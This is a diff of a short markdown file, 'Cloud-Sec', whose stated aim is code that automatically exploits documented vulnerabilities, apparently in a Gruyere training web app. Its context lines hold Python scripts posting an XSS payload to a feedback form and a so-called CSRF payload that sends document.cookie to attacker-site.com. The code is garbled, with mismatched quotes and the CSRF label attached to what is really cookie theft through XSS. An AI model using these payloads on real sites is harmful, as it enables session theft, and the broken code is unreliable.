@@ -1,7 +1,6 @@
 # Cloud-Sec
 create code that can automatically exploit its documented vulnerabilities.
 
-
 **Python Code for Cross-Site Scripting**
 
 import requests
@@ -12,8 +11,8 @@ data = {"feedback": payload}
 response = requests.post(url, data=data)
 print(response.text)
 
-
 **Python Code for Cross-Site Request Forgery**
+
 import requests
 payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + '">';' 
 url = "http://gruyere-app.com/settings" 
